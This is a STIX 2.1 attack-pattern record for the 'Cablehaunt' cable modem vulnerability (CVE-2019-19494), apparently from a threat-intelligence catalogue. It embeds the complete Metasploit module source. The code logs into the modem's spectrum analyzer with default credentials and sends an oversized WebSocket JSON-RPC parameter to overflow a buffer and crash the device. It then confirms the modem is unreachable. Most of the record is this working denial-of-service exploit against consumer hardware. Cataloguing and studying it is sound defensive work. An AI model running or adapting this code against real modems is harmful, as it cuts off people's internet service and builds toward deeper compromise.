{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7589be9e-4300-4198-b914-c64497f4f7e5",
    "created": "2024-08-14T16:26:24.468463Z",
    "modified": "2024-08-14T16:26:24.468466Z",
    "name": "\"Cablehaunt\" Cable Modem WebSocket DoS",
    "description": " There exists a buffer overflow vulnerability in certain Cable Modem Spectrum Analyzer interfaces.  This overflow is exploitable, but since an exploit would differ between every make, model, and firmware version (which also differs from ISP to ISP), this module simply causes a Denial of Service to test if the vulnerability is present. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/cable_haunt_websocket_dos.rb",
            "external_id": "cable_haunt_websocket_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-19494"
        },
        {
            "source_name": "reference",
            "url": "https://cablehaunt.com/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Lyrebirds/sagemcom-fast-3890-exploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'eventmachine'\nrequire 'faye/websocket'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => '\"Cablehaunt\" Cable Modem WebSocket DoS',\n        'Description' => %q{\n          There exists a buffer overflow vulnerability in certain\n          Cable Modem Spectrum Analyzer interfaces.  This overflow\n          is exploitable, but since an exploit would differ between\n          every make, model, and firmware version (which also\n          differs from ISP to ISP), this module simply causes a\n          Denial of Service to test if the vulnerability is present.\n        },\n        'Author' => [\n          'Alexander Dalsgaard Krog (Lyrebirds)', # Original research, discovery, and PoC\n          'Jens Hegner St\u00e6rmose (Lyrebirds)', # Original research, discovery, and PoC\n          'Kasper Kohsel Terndrup (Lyrebirds)', # Original research, discovery, and PoC\n          'Simon Vandel Sillesen (Independent)', # Original research, discovery, and PoC\n          'Nicholas Starke' # msf module\n        ],\n        'References' => [\n          ['CVE', '2019-19494'],\n          ['EDB', '47936'],\n          ['URL', 'https://cablehaunt.com/'],\n          ['URL', 'https://github.com/Lyrebirds/sagemcom-fast-3890-exploit']\n        ],\n        'DisclosureDate' => '2020-01-07',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOST('192.168.100.1'),\n        Opt::RPORT(8080),\n        OptString.new('WS_USERNAME', [true, 'WebSocket connection basic auth username', 'admin']),\n        OptString.new('WS_PASSWORD', [true, 'WebSocket connection basic auth password', 'password']),\n        OptInt.new('TIMEOUT', [true, 'Time to wait for response', 15])\n      ]\n    )\n\n    deregister_options('Proxies')\n    deregister_options('VHOST')\n    deregister_options('SSL')\n  end\n\n  def run\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => '/',\n      'authorization' => basic_auth(datastore['WS_USERNAME'], datastore['WS_PASSWORD'])\n    })\n\n    fail_with(Failure::Unreachable, 'Cannot Connect to Cable Modem Spectrum Analyzer Web Service') if res.nil?\n    fail_with(Failure::Unknown, 'Credentials were incorrect') if res.code != 200\n\n    @succeeded = false\n    EM.run do\n      print_status(\"Attempting Connection to #{datastore['RHOST']}\")\n\n      driver = Faye::WebSocket::Client.new(\"ws://#{datastore['RHOST']}:#{datastore['RPORT']}/Frontend\", ['rpc-frontend'])\n\n      driver.on :open do\n        print_status('Opened connection')\n\n        EM::Timer.new(1) do\n          print_status('Sending payload')\n          payload = Rex::Text.rand_text_alphanumeric(7000..8000)\n          driver.send({\n            jsonrpc: '2.0',\n            method: 'Frontend::GetFrontendSpectrumData',\n            params: {\n              coreID: 0,\n              fStartHz: payload,\n              fStopHz: 1000000000,\n              fftSize: 1024,\n              gain: 1\n            },\n            id: '0'\n          }.to_json)\n        rescue StandardError\n          fail_with(Failure::Unreachable, 'Could not establish websocket connection')\n        end\n      end\n\n      EM::Timer.new(10) do\n        print_status('Checking Modem Status')\n        begin\n          res = send_request_cgi({\n            'method' => 'GET',\n            'uri' => '/'\n          })\n\n          if res.nil?\n            @succeeded = true\n            print_status('Cable Modem unreachable')\n          else\n            fail_with(Failure::Unknown, 'Host still reachable')\n          end\n        rescue StandardError\n          @succeeded = true\n          print_status('Cable Modem unreachable')\n        end\n      end\n\n      EM::Timer.new(datastore['TIMEOUT']) do\n        EventMachine.stop\n        if @succeeded\n          print_good('Exploit delivered and cable modem unreachable.')\n        else\n          fail_with(Failure::Unknown, 'Unknown failure occurred')\n        end\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-01-07"
}